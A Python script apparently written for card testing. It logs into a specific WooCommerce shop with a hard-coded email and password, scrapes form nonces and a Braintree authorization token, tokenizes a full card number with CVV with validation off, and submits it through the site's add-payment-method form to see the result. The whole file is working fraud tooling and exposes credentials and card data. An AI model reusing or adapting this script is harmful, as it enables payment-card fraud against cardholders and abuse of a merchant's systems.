import requests
import re
import json
import base64
import time

def extract_string(s, start, end):
    """Extract a substring between two delimiters."""
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None
        

session = requests.Session()


headers = {
    'authority': 'precisionpowdertx.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'referer': 'https://precisionpowdertx.com/my-account/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

response = session.get('https://precisionpowdertx.com/my-account/', headers=headers)
log = extract_string(response.text, 'input type="hidden" id="woocommerce-login-nonce" name="woocommerce-login-nonce" value="', '" />')



headers = {
    'authority': 'precisionpowdertx.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://precisionpowdertx.com',
    'referer': 'https://precisionpowdertx.com/my-account/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

data = {
    'username': 'buttosaibaby@gmail.com',
    'password': 'DDcc55@&#',
    'woocommerce-login-nonce': log,
    '_wp_http_referer': '/my-account/',
    'login': 'Log in',
}

response = session.post('https://precisionpowdertx.com/my-account/', headers=headers, data=data)






headers = {
    'authority': 'precisionpowdertx.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'referer': 'https://precisionpowdertx.com/my-account/payment-methods/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

response = session.get('https://precisionpowdertx.com/my-account/add-payment-method/', headers=headers)

client = re.search(r'client_token_nonce":"([^"]+)"', response.text).group(1)


add_payment_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"' , response.text).group(1)
    


headers = {
    'authority': 'precisionpowdertx.com',
    'accept': '*/*',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://precisionpowdertx.com',
    'referer': 'https://precisionpowdertx.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

data = {
    'action': 'wc_braintree_credit_card_get_client_token',
    'nonce': client,
}

response = session.post('https://precisionpowdertx.com/wp-admin/admin-ajax.php',headers=headers, data=data)

data3 = json.loads(response.text)
decode = base64.b64decode(data3['data']).decode('utf-8')
data1 = json.loads(decode)
auth = data1.get('authorizationFingerprint',' Not Found.')




headers = {
    'Accept': '*/*',
    'Authorization': f'Bearer {auth}',
    'Braintree-Version': '2018-05-10',
    'Content-Type': 'application/json',
    'Origin': 'https://assets.braintreegateway.com',
    'Referer': 'https://assets.braintreegateway.com',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}

json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '7434070c-bb48-4f87-9f21-48364df5a79f',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': '4397720407175484',
                'expirationMonth': '10',               
                'expirationYear': '2025',
                'cvv': '288',
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

response = session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

data5 = json.loads(response.text)
token = data5['data']['tokenizeCreditCard']['token']



headers = {
    'authority': 'precisionpowdertx.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://precisionpowdertx.com',
    'referer': 'https://precisionpowdertx.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

data = [
	    ('payment_method', 'braintree_credit_card'),
	    ('wc-braintree-credit-card-card-type', 'master-card'),
	    ('wc-braintree-credit-card-3d-secure-enabled', ''),
	    ('wc-braintree-credit-card-3d-secure-verified', ''),
	    ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
	    ('wc_braintree_credit_card_payment_nonce', token),
	    ('wc_braintree_device_data', '{"correlation_id":"310f4c6e9cfb6e5b1cb122c08c820490"}'),
	    ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
        ('woocommerce-add-payment-method-nonce', add_payment_nonce),
        ('_wp_http_referer', '/my-account/add-payment-method/'),
        ('woocommerce_add_payment_method', '1'),
]

time.sleep(5)
response = session.post(
    'https://precisionpowdertx.com/my-account/add-payment-method/',  
    headers=headers,
    data=data,
)

print(response.text)